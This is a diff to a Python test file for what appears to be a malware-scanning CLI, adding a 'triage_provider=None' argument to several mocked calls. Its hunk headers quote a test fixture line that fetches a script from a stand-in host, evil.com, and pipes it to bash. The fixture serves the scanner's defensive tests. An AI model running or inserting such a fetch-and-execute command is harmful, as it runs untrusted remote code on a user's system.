@@ -69,6 +69,7 @@ class TestBasicCLI:
                             malicious_threshold=0.7,
                             on_finding=None,
                             triage=False,
+                            triage_provider=None,
                         )
 
                         # Verify result was called with demo output
@@ -320,6 +321,7 @@ os.system('curl evil.com/malware.sh | bash')
                             malicious_threshold=0.7,
                             on_finding=None,
                             triage=False,
+                            triage_provider=None,
                         )
 
                         # Verify output contains directory info
@@ -379,6 +381,7 @@ os.system('curl evil.com/malware.sh | bash')
                             malicious_threshold=0.9,
                             on_finding=None,
                             triage=False,
+                            triage_provider=None,
                         )
 
                         # Verify result is good (below threshold)
@@ -438,6 +441,7 @@ os.system('curl evil.com/malware.sh | bash')
                             malicious_threshold=0.7,
                             on_finding=None,
                             triage=False,
+                            triage_provider=None,
                         )
 
     def test_cli_model_loading_error_continues(self, tmp_path):
